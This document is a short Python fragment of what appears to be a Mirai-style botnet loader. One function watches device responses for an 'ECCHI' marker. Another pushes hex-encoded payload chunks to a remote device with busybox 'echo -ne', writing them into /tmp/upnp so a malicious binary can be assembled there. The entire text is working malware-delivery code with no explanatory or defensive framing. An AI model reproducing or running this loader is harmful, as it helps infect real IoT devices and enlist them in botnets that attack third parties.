def connection_consume(rdbuff):
    if "ECCHI" in rdbuff:
        return 1
    else:
        return 0


def connection_consume_writeable_dirs():
    pass


def connection_load_dlr(conn, hex_payloads, pos):
    if pos < len(hex_payloads):
        conn.send("/bin/busybox echo -ne \"{}\" {} /tmp/upnp; /bin/echo ECCHI\n".format(hex_payloads[pos],
                                                                                        '>' if pos == 0 else '>>'))
        return 0
    else:
        conn.send("/bin/echo ECCHI\n")
        return 1